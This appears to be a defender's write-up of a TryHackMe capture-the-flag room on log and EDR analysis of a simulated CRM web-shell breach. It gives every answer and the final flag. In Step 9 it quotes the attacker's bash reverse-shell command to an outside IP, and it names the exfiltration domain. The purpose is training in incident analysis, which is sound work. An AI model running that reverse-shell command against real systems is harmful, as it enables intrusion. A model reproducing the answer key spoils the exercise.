# Portal Drop

- **Room:** Portal Drop
- **Module:** [First Shift](https://tryhackme.com/module/first-shift)
- **Category:** Log Analysis / EDR
- **Difficulty:** Easy
- **Date completed:** 16.09.2026

## Summary

The WAF flags a web scan on TryPatchMe's public CRM portal (crm.trypatchme.thm), followed by a suspicious file upload. The task is to figure out, using web access logs and an EDR console, whether this is a false positive or an actual breach - and if it's real, trace what the attacker did: brute force, web shell upload, command execution, a reverse shell, and data exfiltration.

## Walkthrough

### Step 1: What is the IP address that initiated the brute force on the CRM web portal?

The provided log file was one large block of raw text, so I loaded it into Excel to make it readable:

- Data tab -> Get Data -> From File -> From Text/CSV
- Choose the log file and click Import
- In the preview window, click Transform Data instead of Load
- Use Split Column (by delimiter - space, comma, or colon) to separate timestamps, IP addresses, and error codes into clean columns
- Click Close & Load to send the final table into the sheet

Sorting IPs by frequency didn't help, since this CRM has a lot of legitimate high-volume traffic (invoice uploads). Instead I filtered by user-agent. Most were normal browsers, but `python-requests/2.31.0` stood out. Filtering to just that user-agent left only 6 rows, 2 of which had unusually long requests - a sign of base64-encoded command injection.

<img width="945" height="95" alt="image" src="https://github.com/user-attachments/assets/8d19f72c-3f9f-401d-bda9-9150804921f7" />


**Answer:** `34.67.91.83`

### Step 2: How many successful and failed logins are seen in the logs?

Filtered the logs to POST requests on `/login.php`, then sorted by status code. `200` = successful login, `401` = failed login.

<img width="945" height="464" alt="image" src="https://github.com/user-attachments/assets/cad4f3a0-f9b0-4fb3-a452-20cb264e7fa1" />

**Answer:** `18, 35` (18 successful, 35 failed - TryHackMe wants this exact comma-separated format)

### Step 3: Following the brute force, which user-agent was used for the file upload?

Already found while answering Step 1.

**Answer:** `python-requests/2.31.0`

### Step 4: What was the name of the suspicious file uploaded by the attacker?

Also visible in the Step 1 results.

**Answer:** `invoice.php`

### Step 5: At what time did the attacker first invoke the uploaded script?

Also visible in the Step 1 results.

**Answer:** `2025-11-06 14:27:34`

### Step 6: What is the first decoded command the attacker ran on the CRM?

The command included a base64 string, so I used CyberChef to decode it - just Base64 (From Base64) twice in the recipe, with the first executed command's string (`ZDJodllXMXA`) as input.

<img width="945" height="707" alt="image" src="https://github.com/user-attachments/assets/c47dd9a9-0aa9-42c3-935d-5380c7defbbd" />

**Answer:** `whoami`

### Step 7: Based on the attacker's activity on the CRM, which MITRE ATT&CK Persistence sub-technique ID is most applicable?

The room description mentions a web scan and a suspicious file upload, which points toward a web-related sub-technique. Searching (Ctrl+F) for "Web" in the MITRE ATT&CK matrix leads to Web Shell.

<img width="945" height="67" alt="image" src="https://github.com/user-attachments/assets/543f04ba-9170-48e7-af10-7e3614103ec8" />

**Answer:** `T1505.003`

### Step 8: Which process image executes attacker commands received from the web?

This one requires the EDR console rather than the logs.

Open the detection **Suspicious File Write: Backdoor:PHP/Generic**, then go to the IOC/Indicators tab.

<img width="945" height="518" alt="image" src="https://github.com/user-attachments/assets/51a1a288-2d44-4932-b745-376d0f1fdf42" />

**Answer:** `/usr/sbin/php-fpm7.4`

### Step 9: What command allowed the attacker to open a bash reverse shell?

This could also be pulled from the logs (it's the other base64 string from Step 1), but it's easier to find directly in the EDR. Open the detection **Parent-Child Anomaly: Shell Spawn**, then check the IOC/Indicators tab.

<img width="945" height="550" alt="image" src="https://github.com/user-attachments/assets/ff630dc9-53ca-4a0e-8cf1-3de74fa96a41" />

**Answer:** `bash -c "bash -i >& /dev/tcp/115.58.148.86/8080 0>&1"`

### Step 10: Which Linux user executes the entered malicious commands?

Back in **Suspicious File Write: Backdoor:PHP/Generic**, under the Summary tab.

<img width="945" height="439" alt="image" src="https://github.com/user-attachments/assets/5ef6acfc-a063-429a-af7c-6f538dcb93f5" />

**Answer:** `www-data`

### Step 11: What sensitive CRM configuration file did the attacker access?

Took a bit of digging around the EDR. Found under the **System Discovery** detection -> Process Info -> click on `cat` in the process chain -> Sensitive File Read.

<img width="945" height="417" alt="image" src="https://github.com/user-attachments/assets/aaa1b2a6-91f4-4ef0-993a-3f3296a8dc5d" />

**Answer:** `/etc/trycrm/config.json`

### Step 12: Which domain was used to exfiltrate the CRM portal database?

Same **System Discovery** detection, Process Info tab - this time behind the `curl` process in the process chain.

<img width="945" height="463" alt="image" src="https://github.com/user-attachments/assets/125cdecb-2ba4-4f56-bdbf-9b149ea66775" />

**Answer:** `portaldrop2025.xyz`

### Step 13: After responding to all detections, what flag do you obtain?

For each detection, go to the Actions/Response tab and pick the 3 correct response actions. Reviewing each detection's other tabs first (Summary, IOC/Indicators, Process Info) makes it easy to pick the right responses. No penalty for a wrong pick either, just a 30 second delay before trying again.

<img width="945" height="488" alt="image" src="https://github.com/user-attachments/assets/a705bbe5-1275-4804-a1a2-8e2f310a4916" />

<img width="945" height="516" alt="image" src="https://github.com/user-attachments/assets/93e703c2-8601-4ca3-ad0d-813451c1d31e" />

<img width="945" height="439" alt="image" src="https://github.com/user-attachments/assets/7bcb565d-6e27-4222-9fd6-d87680e5c254" />

<img width="945" height="447" alt="image" src="https://github.com/user-attachments/assets/82c408e4-102d-43cb-a6cd-5f162d0a88c0" />

**Answer:** `THM{p0rtal_dropp3d?}`

And voila, there you have it!


## Lessons Learned

Excel's Power Query editor is a solid way to turn a messy raw log file into a clean, filterable table - splitting columns by delimiter makes it possible to sort and filter by IP, status code, or user-agent instead of scrolling through plain text. Pivoting on user-agent rather than just IP frequency was the key move here, since a busy CRM naturally has a lot of repeat traffic from legitimate sources - that is if you dont have access to Bash.

On the EDR side, the answers weren't all sitting in one obvious place. Moving between the Summary, IOC/Indicators, and Process Info tabs of each detection, and following the process chain (e.g. clicking into `cat` or `curl`), was necessary to piece together the full attack chain. CyberChef also earns its place here again for quickly decoding base64 commands without doing it by hand.
